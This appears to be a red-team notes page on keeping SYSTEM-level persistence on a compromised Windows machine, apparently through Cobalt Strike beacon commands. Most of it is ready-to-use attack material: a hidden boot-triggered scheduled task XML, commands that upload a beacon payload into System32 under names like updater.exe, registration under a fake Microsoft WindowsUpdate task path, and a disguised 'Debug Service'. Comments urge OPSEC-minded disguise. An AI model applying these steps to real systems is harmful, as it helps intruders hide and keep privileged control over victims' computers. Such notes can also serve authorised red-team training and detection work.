
Once privileged access has been obtained on a computer, it can be useful to add another round of persistence to ensure that level of privilege can be maintained.
## Scheduled Tasks
The Windows Task Scheduler can execute tasks as SYSTEM as well as standard users.

XML Sample (Save this somewhere on ATTACK box)
```xml
<!-- replace updater.exe with payload name, like msedge.exe, or a cmd! -->
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<Triggers>
		<BootTrigger>
			<Enabled>true</Enabled>
		</BootTrigger>
	</Triggers>
	<Principals>
		<Principal>
			<UserId>NT AUTHORITY\SYSTEM</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
	</Settings>
	<Actions>
		<Exec>
			<Command>C:\Windows\System32\updater.exe</Command>
		</Exec>
	</Actions>
</Task>
```

Creating Scheduled Task
```powershell
beacon> cd C:\Windows\System32
beacon> upload C:\Payloads\beacon_x64.exe  # OPSEC PLEASE, ie updater.exe
beacon> schtaskscreate \<name> XML CREATE # replace "Beacon" 
	# schtaskscreate \Microsoft\Windows\WindowsUpdate\Updater XML CREATE
		# This will open prompt to select XML file to use to schedule

# Delete task if done with it
beacon> schtasksdelete \<name> TASK
```
## Windows Services
An adversary can also create a Windows service to run a payload under the context of SYSTEM, which will start when the computer boots up.

```powershell
beacon> cd C:\Windows\System32\
beacon> upload C:\Payloads\beacon_x64.svc.exe   # OPSEC PLEASE
beacon> mv beacon_x64.svc.exe debug_svc.exe

# Create windows service
beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3

# Verify successful creation
beacon> sc_qc dbgsvc
```